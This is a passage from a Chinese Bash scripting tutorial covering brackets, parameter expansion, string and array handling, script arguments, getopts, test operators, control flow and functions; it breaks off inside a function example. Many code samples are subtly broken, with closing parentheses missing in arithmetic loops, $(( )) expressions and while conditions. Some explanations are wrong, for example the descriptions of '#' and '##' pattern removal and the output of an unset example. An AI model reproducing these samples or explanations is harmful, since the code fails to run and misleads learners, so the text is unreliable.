④常用于算术运算比较,双括号中的变量可以不使用$符号前缀。括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则,比如可以直接使用for((i=0;i < 5;i++), 如果不使用双括号, 则为for i in `seq 0 4`或者for i in {0..4}。再如可以直接使用if(($i < 5), 如果不使用双括号则为if [ $i -lt 5 ]

</pre><h4>二、中括号,方括号[]</h4><pre>
1、单中括号 []
①bash的内部命令,[和test是等同的。如果我们不用绝对路径指明,通常我们用的都是bash自带的命令。if/test结构中的左中括号是调用test的命令标识,右中括号是关闭条件判断的。这个命令把它的参数作为比较表达式或者作为文件测试,并且根据比较的结果来返回一个退出状态码。if/test结构中并不是必须右中括号,但是新版的Bash中要求必须这样。

②Test和[]中可用的比较运算符只有==和!=,两者都是用于字符串比较的,不可用于整数比较,整数比较只能使用-eq,-gt这种形式。无论是字符串比较还是整数比较都不支持大于号小于号。如果实在想用,对于字符串比较可以使用转义形式,如果比较"ab"和"bc":[ ab \< bc ],结果为真,也就是返回状态为0。[ ]中的逻辑与和逻辑或使用-a 和-o 表示。

③字符范围。用作正则表达式的一部分,描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。

④在一个array结构的上下文中,中括号用来引用数组中每个元素的编号。

2、双中括号[[ ]]
①[[是bash程序语言的关键字。并不是一个命令,[[ ]] 结构比[ ]结构更加通用。在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割,但是会发生参数扩展和命令替换。

②支持字符串的模式匹配,使用=~操作符时甚至支持shell的正则表达式。字符串比较时可以把右边的作为一个模式,而不仅仅是一个字符串,比如[[ hello == hell? ]],结果为真。[[ ]] 中匹配字符串或通配符,不需要引号。

③使用[[ ... ]]条件判断结构,而不是[ ... ],能够防止脚本中的许多逻辑错误。比如,&&、||、<和> 操作符能够正常存在于[[ ]]条件判断结构中,但是如果出现在[ ]结构中的话,会报错。比如可以直接使用if [[ $a != 1 && $a != 2 ]], 如果不适用双括号, 则为if [ $a -ne 1] && [ $a != 2 ]或者if [ $a -ne 1 -a $a != 2 ]。

④bash把双中括号中的表达式看作一个单独的元素,并返回一个退出状态码。

例子:
if($i < 5)
if [ $i -lt 5 ]
if [ $a -ne 1 -a $a != 2 ]
if [ $a -ne 1] && [ $a != 2 ]
if [[ $a != 1 && $a != 2 ]]
for i in $(seq 0 4);do echo $i;done
for i in `seq 0 4`;do echo $i;done
for((i=0; i < 5;i++);do echo $i;done
for i in {0..4};do echo $i;done

</pre><h4>三、大括号、花括号 {}</h4><pre>
${ }变量替换
一般情况下,$var与${var}是没有区别的,但是用${ }会比较精确的界定变量名称的范围
$ A=Linux
$ echo $AB    #表示变量AB
$ echo ${A}B  #表示变量A后连接着B

1、常规用法
①大括号拓展。(通配(globbing)将对大括号中的文件名做扩展。在大括号中,不允许有空白,除非这个空白被引用或转义。
第一种:对大括号中的以逗号分割的文件列表进行拓展。如touch {a,b}.txt 结果为a.txt b.txt。
第二种:对大括号中以点点(..)分割的顺序文件列表起拓展作用,如:touch {a..d}.txt 结果为a.txt b.txt c.txt d.txt

$ ls {ex1,ex2}.sh        # ex1.sh ex2.sh
$ ls {ex{1..3},ex4}.sh   # ex1.sh ex2.sh ex3.sh ex4.sh
$ ls {ex[1-3],ex4}.sh    # ex1.sh ex2.sh ex3.sh ex4.sh

②代码块,又被称为内部组,这个结构事实上创建了一个匿名函数。与小括号中的命令不同,大括号内的命令不会新开一个子shell运行,即脚本余下部分仍可使用括号内变量。括号内的命令间用分号隔开,最后一个也必须有分号。{}的第一个命令和左括号之间必须要有一个空格。

2、几种特殊的替换结构
${var:-string},${var:+string},${var:=string},${var:?string}

①${var:-string}和${var:=string}
若变量var为空,则用在命令行中用string来替换${var:-string},否则变量var不为空时,则用变量var的值来替换${var:-string};
对于${var:=string}的替换规则和${var:-string}是一样的,所不同之处是${var:=string}若var为空时,用string替换${var:=string}的同时,把string赋给变量var: ${var:=string}很常用的一种用法是,判断某个变量是否赋值,没有的话则给它赋上一个默认值。

② ${var:+string}的替换规则和上面的相反,即只有当var不是空的时候才替换成string,若var为空时则不替换或者说是替换成变量 var的值,即空值。(因为变量var此时为空,所以这两种说法是等价的)

③${var:?string}替换规则为:若变量var不为空,则用变量var的值来替换${var:?string};若变量var为空,则把string输出到标准错误中,并从脚本中退出。我们可利用此特性来检查是否设置了变量的值。

补充扩展:在上面这五种替换结构中string不一定是常值的,可用另外一个变量的值或是一种命令的输出。

${var-sting}   若$var没设定则使用sting作传回值,设置默认值      空值及非空值不作处理
${var:-sting}  若$var没有设定或为空值则使用sting作传回值       非空值时不作处理
${var+sting}   若$var设为空值或非空值均使用sting作传回值       没设定时不作处理
${var:+sting}  若$var为非空值则使用sting作传回值              没设定及空值不作处理
${var=sting}   若$var没设定则回传txt,并将$var赋值为sting       空值及非空值不作处理
${var:=sting}  若$var没设定或空值则回传txt,将$var赋值为sting   非空值时不作处理
${var?sting}   若$var没设定则将sting输出至STDERR              空值及非空值不作处理
${var:?sting}  若$var没设定或空值则将sting输出至STDERR         非空值时不作处理

以上的理解在于一定要分清楚 unset 与 null 及 non-null 这三种赋值状态
一般而言, : 与 null 有关, 若不带 : 的话, null 不受影响, 若带 : 则连 null 也受影响.

3、四种模式匹配替换结构
模式匹配记忆方法:
# 是去掉左边(在键盘上#在$之左边)
% 是去掉右边(在键盘上%在$之右边)
#和%中的单一符号是最小匹配,两个相同符号是最大匹配。

第一种模式:${variable%pattern}
shell在variable中查找,如果是以给定的模式pattern结尾就从命令行把variable中的内容去掉右边最短的匹配模式
第二种模式: ${variable%%pattern}
shell在variable中查找,如果是以给定的模式pattern结尾就从命令行把variable中的内容去掉右边最长的匹配模式
第三种模式:${variable#pattern}
shell在variable中查找,如果是以给定的模式pattern结尾就从命令行把variable中的内容去掉左边最短的匹配模式
第四种模式: ${variable##pattern}
shell在variable中查找,如果是以给定的模式pattern结尾就从命令行把variable中的内容去掉右边最长的匹配模式

这四种模式中都不会改变variable的值,其中,只有在pattern中使用了*匹配符号时,%和%%,#和##才有区别。
结构中的pattern支持通配符,*表示零个或多个任意字符,?表示仅与一个任意字符匹配,[...]表示匹配中括号里面的字符,[!...]表示不匹配中括号里面的字符。

$ var=testcase
$ echo ${var%s*e}    # testca
$ echo $var          # testcase
$ echo ${var%%s*e}   # te
$ echo ${var#?e}     # stcase
$ echo ${var##?e}    # stcase
$ echo ${var##*e}
$ echo ${var##*s}    # e
$ echo ${var##test}  # case

4、字符串提取和替换
第一种模式:${var:num},shell在var中提取第num个字符到末尾的所有字符。若num为正数则从左边0处开始;若num为负数则从右边开始提取字串,但必须使用在冒号后面加空格或一个数字或整个num加上括号,如${var: -2}、${var:1-3}或${var:(-2)}。
第二种模式:${var:start:lenth},表示从$var字符串的第$start个位置开始提取长度为$lenth的子串。不能为负数。
第三种模式:${var/pattern/pattern}表示将var字符串的第一个匹配的pattern替换为另一个pattern。
第四种模式:${var//pattern/pattern}表示将var字符串中的所有能匹配的pattern替换为另一个pattern。

$ var=/home/centos
$ echo ${var:5}     # /centos
$ echo ${var: -6}   # centos
$ echo ${var:(-6)}  # centos
$ echo ${var:1:4}   # home
$ echo ${var/o/h}   # /hhme/centos
$ echo ${var//o/h}  # /hhme/cenths

四、符号$后的括号
(1)${a} 变量a的值,在不引起歧义的情况下可以省略大括号。
(2)$(cmd) 命令替换,和`cmd`效果相同,结果为shell命令cmd的输,过某些Shell版本不支持$()形式的命令替换, 如tcsh。
(3)$((expression) 和`exprexpression`效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。

五、使用
1、多条命令执行
(1)单小括号,(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。
(2)单大括号,{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。
对{}和()而言, 括号中的重定向符只影响该条命令, 而括号外的重定向符影响到括号中的所有命令。


</pre>
</div>

<div id="shell_str">
<h4>Shell字符串</h4><pre>
字符串是shell编程中最常用最有用的数据类型(还有数字,ture/false),字符串可以用单引号,也可以用双引号,也可以不用引号。单双引号的区别跟PHP类似。

str='this is a string'

单引号字符串的限制:
单引号里的任何字符都会原样输出,单引号字符串中的变量是无效的;
单引号字串中不能出现单引号(对单引号使用转义符后也不行)。

双引号
your_name='qinjx'
str="Hello, I know your are \"$your_name\"! \n"
str_1="Hello, I know your are \"${your_name}\"! \n"
echo ${#str}      #输出字符串长度
echo $str $str_1

双引号的优点:
双引号里可以有变量,可用于字符串的拼接
双引号里可以出现转义字符

在脚本运行中,为了避免出现引用为声明的字符串变量时,可以在如下处理:
#如果str没声明则输出DEFAULT
echo "${str=DEFAULT}"

#字符串长度
echo ${#str}

【字符串与数字的转换】
name + 0              # 将字符串转换为数字
number " "            # 将数字转换成字符串

【字符串截取】
str="abc,def,ghi,abcjkl"
echo ${str:1}          #提取子字符串,从字符串第2个字符开始,输出 bc,def,ghi,abcjkl
echo ${str:1:4}        #提取子字符串,从字符串第2个字符开始截取4个字符,输出 bc,d
echo ${str#a*c}        #从str开头开始删除最短的i*e匹配,输出  ,def,ghi,abcjkl
echo ${str##a*c}       #从str开头开始删除最长的i*e匹配,输出  jkl
echo ${str%b*l}        #从str结尾开始删除最短的b*l匹配,输出  abc,def,ghi,a
echo ${str%%b*l}       #从str结尾开始删除最长的b*l匹配,输出  a
echo ${str/abc/TEST}   #用TEST替换字符串str中第一个abc,输出 TEST,def,ghi,abcjkl
echo ${str//abc/TEST}  #用TEST替换字符串中所有的abc,输出 TEST,def,ghi,TESTjkl
echo ${str/#a*c/TEST}  #从str开头匹配,用TEST替换最长的a*c,输出 TESTjkl
echo ${str/%b*l/TEST}  #从str结尾匹配,用TEST替换最长的b*l,输出 aTEST

【expr操作字符串】
str='2016-01-05'

#求字符串长度
length=`expr length $str`
echo $length   #10

#截取字符串
substr=`expr substr $str 1 4`
echo $substr   #2016

#求字符串中元素的下标索引,如果元素不存在输出0(因为此时索引从1开始)
index=`expr index $str "2"`
echo $index     #1

string="runoob is a great company"
echo `expr index "$string" is`  # 查找子字符串,查找字符 "i 或 s" 的位置,输出 8

【split字符串】
一般截取字符串还可以用cut和awk,如:
str='2016-01-05'
echo $str | awk -F '-' '{print $1}'
echo $str | awk '{print substr($str,1,4)}'
echo $str | awk -F '-' '{for( i=1;i<=NF; i++ ) print $i}'

#2016
#2016
#2016
#01
#05

但是不建议采用这种方式,因为当文件很大,有很多行,上述方式需要开辟管道,会启动新进程,效率很低下。同时,如果要把awk结果存在数组时就还需要一个for循环才行。
因此,建议采用下面这种方式:
arr=(${str//-/ })
echo ${arr[1]}

#01

把split结果存到数组中后,剩下的就是对数组的操作,如果对Shell数组不熟,那么可以参考Shell数组

Shell字符串操作、Shell数组熟悉之后就可以用Shell进行小文件处理。

</pre>
</div>

<div id="shell_arr">
<h4>Shell数组</h4><pre>
bash支持一维数组,不支持多维数组,并且没有限定数组的大小
数组元素的下标由0开始编号。获取数组中的元素要利用下标,下标可以是整数或算术表达式,其值应大于或等于0
可以不使用连续的下标,而且下标的范围没有限制,未被赋值的空位置不计算进长度

数组元素的数据类型可以不同
数组元素是以" "(空格符)隔开,而不是","(逗号)

数组初始化
null_arr=()
array_name=(value0 value1 value2 value3)

array_name=(
  value0
  value1
  value2
  value3
)

array_name[0]=value0
array_name[1]=value1
array_name[n]=valuen

#间隔索引
array3=( [9]=nine [11]=11 )
echo ${array3[9]}
echo ${array3[11]}

#读取键盘输入,空格隔开,换行结束
read -a array4
exit 0

【读取数组】
如果直接打印数组名$array_name那么只会输出数组的第一个元素
读取数组元素值的一般格式是:${数组名[下标]}

valuen=${array_name[n]}
lengthn=${#array_name[n]} # 取得数组单个元素的长度

array=( apple bat cat dog elephant frog )
echo 打印第一个元素
echo ${array[0]}
echo ${array:0}

echo 总元素数
echo ${#array[@]}
echo ${#array[*]}

echo 打印所有元素
echo ${array[@]}
echo ${array[*]}
echo ${array[@]:0}

echo 第一个元素的长度
echo ${#array[0]}
echo ${#array}

echo 除了第一个元素,打印所有元素
echo ${array[@]:1}

echo 从第二个元素开始,打印四个元素
echo ${array[@]:1:4}

echo 将所有元素的a替换为A
echo ${array[@]//a/A}

【数组的遍历】
1、for循环
len=${#array_name[@]}
for((i = 0; i < len; i++);do
{
    echo $i"th element: ${array_name[i]}"
}
done

2、用下标索引遍历
for i in "${!array_name[@]}";do
{
    echo $i"th element: ${array_name[i]}"
}
done

3、直接访问元素
for val in ${array_name[@]};do
{
    echo $val
}
done

4、while-do遍历
i=0
while [ $i -lt ${#array_name[@]} ];do
{
    echo $i"th element: ${array_name[i]}"
    #i=$(($i + 1)
    #let ++i
    let i++
}
done

【 删除数组 】
直接通过 unset 数组[下标] 可以清除相应的元素
不带下标 unset 数组 清除整个数据

echo ${varlist[*]}
1 100 3 4 5 8
unset varlist[7]
echo ${varlist[*]}
1 100 3 4 5
不带下标,清除整个数据
unset varlist
</pre>
</div>

<div id="shell_arg">
<h4>Shell 传递参数</h4><pre>
可以在执行Shell脚本时向脚本传递参数,脚本内获取参数的格式为:$n
n代表一个数字,1为执行脚本的第一个参数,2为执行脚本的第二个参数,以此类推

$#  传递到脚本的参数个数,不包括文件名参数
$*  以一个单字符串显示所有向脚本传递的参数。如"$*"用「"」括起来的情况、以"$1 $2 … $n"的形式输出所有参数。
$$  脚本运行的当前进程ID号
$!  后台运行的最后一个进程的ID号
$@  与$*相同,但是使用时加引号,并在引号中返回每个参数。如"$@"用「"」括起来的情况、以"$1" "$2""$n"的形式输出所有参数。
$-  显示Shell使用的当前选项,与set命令功能相同。
$?  显示最后命令的退出状态。0表示没有错误,其他任何值表明有错误。

</pre><textarea>#!/bin/bash
#shell脚本代码
echo "Shell 传递参数实例！";
echo "传递到脚本的参数个数:$#";
echo "所有向脚本传递的参数: $*";
echo "所有向脚本传递的参数: $@";
echo "脚本运行的当前进程id号:$$";
echo "后台运行的最后一个进程的ID号:$!";
echo "显示Shell使用的当前选项,与set命令功能相同:$-";
echo "执行的文件名:$0";
echo "第一个参数为:$1";
echo "第二个参数为:$2";
echo "第三个参数为:$3";
echo "显示最后命令的退出状态。0表示没有错误,其他任何值表明有错误:$?";

为脚本设置可执行权限并传递参数执行
$ chmod +x test.sh
$ ./test.sh 1 2 3

</textarea><pre>
在为shell脚本传递的参数中如果包含空格,应该使用单引号或者双引号将该参数括起来,以便于脚本将这个参数作为整体来接收。

在有参数时,可以使用对参数进行校验的方式处理以减少错误发生:中括号 [] 与其中间的代码应该有空格隔开
if [ -n "$1" ]; then
    echo "包含第一个参数"
else
    echo "没有包含第一参数"
fi

【shift命令】
用于对参数的移动(左移),通常用于在不知道传入参数个数时依次遍历每个参数然后进行相应处理,常见于Linux中各种程序的启动脚本

shift(默认为shift 1)命令每执行一次,变量的个数($#)减一,之前的$1变量被销毁,之后的$2就变成了$1,而变量值提前一位;
shift n后,前n位参数都会被销毁

</pre><textarea>#!/bin/bash
#scriptname = run.sh
while [ $# != 0 ];do
  echo "第一个参数为:$1,参数个数为:$#"
  shift
done

# 依次读取输入的参数并打印参数个数
# run run.sh a b c d e f
# 第一个参数为:a,参数个数为:6
# 第一个参数为:b,参数个数为:5
# 第一个参数为:c,参数个数为:4
# 第一个参数为:d,参数个数为:3
# 第一个参数为:e,参数个数为:2
# 第一个参数为:f,参数个数为:1

</textarea>

<h4>通过getopts命令获取命令行选项</h4><pre>
语法为:getopts 选项行 选项变量。
选项行由各选项的单一字符组成,如某选项字符需要参数,则在选项字符后加冒号,调用时此选项后无参数的话系统会提示错误,如不希望出现提示则应在选项行最前面加上冒号。

选项之间可以通过冒号:进行分隔,也可以直接相连接,:表示选项后面必须带有参数,如果没有:表示可以不加实际值进行传递

当optstring以":"开头时,getopts会区分invalid option错误和miss option argument错误。
invalid option时,varname会被设成?,$OPTARG是出问题的option;
miss option argument时,varname会被设成:,$OPTARG是出问题的option。
如果optstring不以":"开头,invalid option错误和miss option argument错误都会使varname被设成?,$OPTARG是出问题的option

系统会将参数存入OPTARG变量。

</pre><textarea>#!/bin/bash
while getopts "a:" opt; do
  case $opt in
    a)
      echo "this is -a the arg is ! $OPTARG"
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      ;;
  esac
done

$ bash test.sh -a hello
this is -a the arg is ! hello

</textarea><textarea>#!/bin/bash
while getopts "a:b:cdef" opt; do
  case $opt in
    a)
      echo "this is -a the arg is ! $OPTARG"
      ;;
    b)
      echo "this is -b the arg is ! $OPTARG"
      ;;
    c)
      echo "this is -c the arg is ! $OPTARG"
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      ;;
  esac
done

$ sh study -a hello -c
this is -a the arg is ! hello
this is -c the arg is !

$ bash test.sh -a hello -b
this is -a the arg is ! hello
test.sh: option requires an argument -- b
Invalid option: -

$ bash test.sh -a hello -b hello -c
this is -a the arg is ! hello
this is -b the arg is ! hello
this is -c the arg is !

</textarea><textarea>#!/bin/bash
#echo 将参数存入OPTARG变量:$OPTARG
while getopts :a:bc opt; do
  case $opt in
  a)
    echo "选项a,后跟参数:$OPTARG";;
  b)
    echo "选项b";;
  c)
    echo "选项c";;
  *)
    ;;
  esac
done

sh study -a

$ sh study -a 123
选项a,后跟参数:123

sh study -abc
选项a,后跟参数:bc

$ sh study -a 123  -bc
选项a,后跟参数:123
选项b
选项c

</textarea>
</div>

<div id="shell_calc">
<h4>Shell 基本运算符</h4><pre>
Shell和其他编程语言一样,支持多种运算符,包括:
算数运算符
关系运算符
布尔运算符
字符串运算符
文件测试运算符

可以将算术运算式以$[ 算术运算式 ]的形式进行求值。注意算术运算式和[]必须有空格分隔,此方法只支持整型运算。
例如:test=$[ 32 * 17 ]

使用$((运算式)的形式也可以进行算术运算求值,并且可以进行布尔运算。
例如:test=$(( 32 * 17 )

使用let 运算式也能进行算术运算,算术式各元素间不得有空格,否则应将算术式用引号括起来。
例如:let ++test

完整的表达式要被 ` ` 包含
表达式和运算符之间要有空格

原生bash不支持简单的数学运算,但是可以通过其他命令来实现,例如 awk 和 expr(最常用)
expr是一款表达式计算工具,使用它能完成表达式的求值操作。

例如,两个数相加(注意使用的是反引号 ` 而不是单引号 '):
val=`expr 2 + 2`
echo "两数之和为 : $val"

算术运算符
+ 加法                                             `expr $a + $b` 结果为 30
- 减法                                             `expr $a - $b` 结果为 -10
* 乘法 乘号(*)前边必须加反斜杠(\)才能实现乘法运算     `expr $a \* $b` 结果为  200
/ 除法                                             `expr $b / $a` 结果为 2
% 取余                                             `expr $b % $a` 结果为 0
= 赋值                                             a=$b 将把变量 b 的值赋给 a
== 相等。用于比较两个数字,相同则返回true              [ $a == $b ] 返回 false
!= 不相等。用于比较两个数字,不相同则返回true          [ $a != $b ] 返回 true

</pre><textarea>a=5
b=6
result=$[a+b]                # 代码中的 [] 执行基本的算数运算,注意等号两边不能有空格
echo "result 为: $result"

</textarea><textarea>if [ $a == $b ]
then
   echo "a 等于 b"
fi
if [ $a != $b ]
then
   echo "a 不等于 b"
fi

</textarea><pre>
【关系运算符】
关系运算符只支持数字,不支持字符串,除非字符串的值是数字

-eq 检测两个数相等返回 true。                   [ $a -eq $b ] 返回 false
-ne 检测两个数不相等返回 true。                 [ $a -ne $b ] 返回 true
-gt 检测左边的数大于右边则返回 true。            [ $a -gt $b ] 返回 false
-lt 检测左边的数小于右边则返回 true。            [ $a -lt $b ] 返回 true
-ge 检测左边的数大于等于右边则返回 true。        [ $a -ge $b ] 返回 false
-le 检测左边的数小于等于右边则返回 true。        [ $a -le $b ] 返回 true

【字符串运算符】
=   检测两个字符串相等返回 true。    [ $a = $b ] 返回 false。
!=  检测两个字符串不相等返回 true。  [ $a != $b ] 返回 true。
-z  检测字符串长度为0返回 true。     [ -z $a ] 返回 false。
-n  检测字符串长度不为0返回 true。   [ -n $a ] 返回 true。
str 检测字符串不为空返回 true。      [ $a ] 返回 true。

【布尔运算符】
!   非运算,表达式为true则返回false,否则返回true。  [ ! false ] 返回 true。
-o  或运算,有一个表达式为true则返回true。          [ $a -lt 20 -o $b -gt 100 ] 返回 true。
-a  与运算,两个表达式都为true才返回true。          [ $a -lt 20 -a $b -gt 100 ] 返回 false。

【逻辑运算符】
&&  逻辑的AND     [[ $a -lt 100 && $b -gt 100 ]] 返回 false
||  逻辑的OR      [[ $a -lt 100 || $b -gt 100 ]] 返回 true

【文件测试运算符】
文件测试运算符用于检测 Unix 文件的各种属性
-b file 检测文件是块设备文件则返回true。                  [ -b $file ] 返回 false。
-c file 检测文件是字符设备文件则返回true。                [ -c $file ] 返回 false。
-d file 检测文件是目录则返回true。                       [ -d $file ] 返回 false。
-f file 检测文件是普通文件(不是目录或设备文件)则返回true。  [ -f $file ] 返回 true。
-g file 检测文件设置了SGID位则返回 true。                 [ -g $file ] 返回 false。
-k file 检测文件设置了粘着位(Sticky Bit)则返回 true。     [ -k $file ] 返回 false。
-p file 检测文件是有名管道则返回true。                    [ -p $file ] 返回 false。
-u file 检测文件设置了SUID位则返回true。                  [ -u $file ] 返回 false。
-r file 检测文件可读则返回true。                         [ -r $file ] 返回 true。
-w file 检测文件可写则返回true。                         [ -w $file ] 返回 true。
-x file 检测文件可执行则返回true。                       [ -x $file ] 返回 true。
-s file 检测文件不为空(文件大小是否大于0)返回true。        [ -s $file ] 返回 true。
-e file 检测文件(包括目录)存在则返回 true。               [ -e $file ] 返回 true。

</pre>

<h4>Shell的test命令</h4><pre>
test命令是shell环境中测试条件表达式的实用工具
用于检查某个条件是否成立,它可以进行数值、字符和文件三个方面的测试

数值测试
-eq 等于则为真
-ne 不等于则为真
-gt 大于则为真
-ge 大于等于则为真
-lt 小于则为真
-le 小于等于则为真

</pre><textarea>num1=100
num2=100
if test $[num1] -eq $[num2]
then
    echo '两个数相等！'
else
    echo '两个数不相等！'
fi

</textarea><pre>
字符串测试
=   等于则为真
!=  不相等则为真
-z 字符串  字符串的长度为零则为真
-n 字符串  字符串的长度不为零则为真

</pre><textarea>num1="ru1noob"
num2="runoob"
if test $num1 = $num2
then
    echo '两个字符串相等!'
else
    echo '两个字符串不相等!'
fi

</textarea><pre>
文件测试
-e 文件名  如果文件存在则为真
-r 文件名  如果文件存在且可读则为真
-w 文件名  如果文件存在且可写则为真
-x 文件名  如果文件存在且可执行则为真
-s 文件名  如果文件存在且至少有一个字符则为真
-d 文件名  如果文件存在且为目录则为真
-f 文件名  如果文件存在且为普通文件则为真
-c 文件名  如果文件存在且为字符型特殊文件则为真
-b 文件名  如果文件存在且为块特殊文件则为真

</pre><textarea>cd /bin
if test -e ./bash
then
    echo '文件已存在!'
else
    echo '文件不存在!'
fi

</textarea>Shell还提供了与( -a )、或( -o )、非( ! )三个逻辑操作符用于将测试条件连接起来,其优先级为:"!"最高,"-a"次之,"-o"最低<textarea>
cd /bin
if test -e ./notFile -o -e ./bash
then
    echo '至少有一个文件存在!'
else
    echo '两个文件都不存在'
fi

</textarea>
</div>

<div id="shell_flow">
<h3>shell流程控制</h3><pre>
和Java、PHP等语言不一样,sh的流程控制不可为空,如果else分支没有语句执行,就不要写这个else

if语句
if语句中condition为真,即命令行执行condition返回的$?为0,则执行then后面的语句

if condition
then
    command1
    command2
    ...
    commandN
fi

写成一行(适用于终端命令提示符):
if [ $(ps -ef | grep -c "ssh") -gt 1 ]; then echo "true"; fi

if else语句
if condition
then
    command1
    command2
    ...
    commandN
else
    command
fi

if else-if else语句
if condition1
then
    command1
elif condition2
then
    command2
else
    commandN
fi

</pre><textarea>a=10
b=20
if [ $a == $b ]
then
   echo "a 等于 b"
elif [ $a -gt $b ]
then
   echo "a 大于 b"
elif [ $a -lt $b ]
then
   echo "a 小于 b"
else
   echo "没有符合的条件"
fi

</textarea>if else语句经常与test命令结合使用<textarea>num1=$[2*3]
num2=$[1+5]
if test $[num1] -eq $[num2]
then
    echo '两个数字相等!'
else
    echo '两个数字不相等!'
fi

</textarea><pre>
【for循环】
for var in item1 item2 ... itemN
do
    command1
    command2
    ...
    commandN
done

写成一行:
for var in item1 item2 ... itemN; do command1; command2… done;

当变量值在列表里,for循环即执行一次所有命令,使用变量名获取列表中的当前取值。
命令可为任何有效的shell命令和语句。
in列表可以包含替换、字符串和文件名。
in列表是可选的,如果不用它,for循环使用命令行的位置参数

</pre><textarea>for loop in 1 2 3 4 5             # 顺序输出当前列表中的数字
do
    echo "The value is: $loop"
done

for str in 'This is a string'     # 顺序输出字符串中的字符
do
    echo $str                     # This is a string
done

for str in 'This is a string'
do
    echo ${str} +                 # This is a string +
done

for skill in Ada Coffe Action Java; do
    echo "I am good at ${skill}Script"
done

for file in `ls /etc`; do
echo $file
done

</textarea><pre>
【while循环】
用于不断执行一系列命令,也用于从输入文件中读取数据;命令通常为测试条件。其格式为:
while condition
do
    command
done

</pre><textarea>int=1
while(( $int<=5 )
do
    echo $int
    let "int++"    # let命令用于执行一或多个表达式,变量计算中不需要加上$来表示变量,如果表达式中包含了空格或其他特殊字符则必须引起来
done

</textarea>while循环可用于读取键盘信息,按Ctrl-D结束循环<textarea>echo '按下 CTRL-D 退出'
echo -n '输入你最喜欢的网站名: '
while read FILM
do
    echo "是的！$FILM 是一个好网站"
done

</textarea><pre>
【无限循环语法】
while :
do
    command
done

或者
while true
do
    command
done

或者
for(( ; ; )

【until 循环】
until循环执行一系列命令直至条件为true时停止。
until循环与while循环在处理方式上刚好相反。
一般while循环优于until循环,但在某些时候—也只是极少数情况下,until循环更加有用。

until 语法格式:
until condition
do
    command
done
condition 一般为条件表达式,如果返回值为 false,则继续执行循环体内的语句,否则跳出循环

</pre><textarea>a=0
until [ ! $a -lt 10 ]
do
   echo $a
   a=`expr $a + 1`
done

</textarea><pre>
【case】
Shell case语句为多选择语句。可以用case语句匹配一个值与一个模式,如果匹配成功执行相匹配的命令

case语句格式如下:
case 值 in
  模式1)
    command1
    command2
    ...
    commandN
    ;;
  模式2)
    command1
    command2
    ...
    commandN
    ;;
  *)
    command
    ;;
esac

case取值后面必须为单词in,每一模式必须以右括号结束。取值可以为变量或常数。匹配发现取值符合某一模式后,其间所有命令开始执行直至 ;;。
取值将检测匹配的每一个模式。一旦模式匹配,则执行完匹配模式相应命令后不再继续其他模式。如果无一匹配模式,使用星号 * 捕获该值,再执行后面的命令。

</pre><textarea>echo '输入 1 到 4 之间的数字:'
echo '你输入的数字为:'
read aNum
case $aNum in
    1)  echo '你选择了 1'
    ;;
    2)  echo '你选择了 2'
    ;;
    3)  echo '你选择了 3'
    ;;
    4)  echo '你选择了 4'
    ;;
    *)  echo '你没有输入 1 到 4 之间的数字'
    ;;
esac

</textarea><pre>
【跳出循环】
在循环过程中,有时候需要在未达到循环结束条件时强制跳出循环,Shell使用两个命令来实现该功能:break和continue。
break命令允许跳出所有循环(终止执行后面的所有循环)
continue命令与break命令类似,只有一点差别,它不会跳出所有循环,仅仅跳出当前循环

esac
case的语法和C family语言差别很大,它需要一个esac(就是case反过来)作为结束标记,每个case分支用右圆括号,用两个分号表示break

</pre>输入错误即退出<textarea>while :
do
  echo -n "输入 1 到 5 之间的数字:"
  read aNum
  case $aNum in
      1|2|3|4|5) echo "你输入的数字为 $aNum!"
      ;;
      *) echo "你输入的数字不是 1 到 5 之间的! 游戏结束"
          break
      ;;
  esac
done

</textarea>输入错误即重新开始<textarea>while :
do
    echo -n "输入 1 到 5 之间的数字: "
    read aNum
    case $aNum in
        1|2|3|4|5) echo "你输入的数字为 $aNum!"
        ;;
        *) echo "你输入的数字不是 1 到 5 之间的!"
            continue
            echo "游戏结束"
        ;;
    esac
done

</textarea>
</div>

<div id="shell_func">
<h3>Shell 函数</h3><pre>
linux shell可以用户定义函数,然后在shell脚本中可以随便调用。

shell中函数的定义格式如下:
[ function ] funname [()]
{
    action;
    [return int;]
}

可以带function fun()定义,也可以直接fun()定义,不带任何参数。
参数返回可以显示加:return返回,如果不加将以最后一条命令运行结果作为返回值。 return后跟数值n(0-255)
函数返回值在调用该函数后通过 $? 来获得
所有函数在使用前必须定义。这意味着必须将函数放在脚本开始部分,直至shell解释器首次发现它时才可以使用。调用函数仅使用其函数名即可

在Shell中,调用函数时可以向其传递参数。在函数体内部,通过$n的形式来获取参数的值,例如,$1表示第一个参数,$2表示第二个参数...
$10不能获取第十个参数,获取第十个参数需要${10}。当n>=10时需要使用${n}来获取参数

【return和exit】
shell脚本中,一般在脚本的函数里面使用return语句,函数中使用return语句表示函数执行完毕,函数中return语句后面的代码将不再执行,同时脚本将继续执行函数后的代码。

但是exit 0无论在脚本中还是函数中,一旦使用将退出整个shell脚本。

【特殊字符用来处理参数】
$#  传递到脚本的参数个数
$*  以一个单字符串显示所有向脚本传递的参数
$$  脚本运行的当前进程ID号
$!  后台运行的最后一个进程的ID号
$@  与$*相同,但是使用时加引号,并在引号中返回每个参数。
$-  显示Shell使用的当前选项,与set命令功能相同。
$?  显示最后命令的退出状态。0表示没有错误,其他任何值表明有错误。

</pre><textarea>demoFun(){
    echo "这是我的第一个 shell 函数!"
}
echo "-----函数开始执行-----"
demoFun
echo "-----函数执行完毕-----"

</textarea><textarea>funWithReturn(){
    echo "这个函数会对输入的两个数字进行相加运算..."
    echo "输入第一个数字: "
    read aNum
    echo "输入第二个数字: "
    read anotherNum
    echo "两个数字分别为 $aNum 和 $anotherNum !"
    return $(($aNum+$anotherNum)
}
funWithReturn
echo "输入的两个数字之和为 $? !"

</textarea><textarea>funWithParam(){
    echo "第一个参数为 $1 !"
    echo "第二个参数为 $2 !"
    echo "第十个参数为 $10 !"
    echo "第十个参数为 ${10} !"
    echo "第十一个参数为 ${11} !"
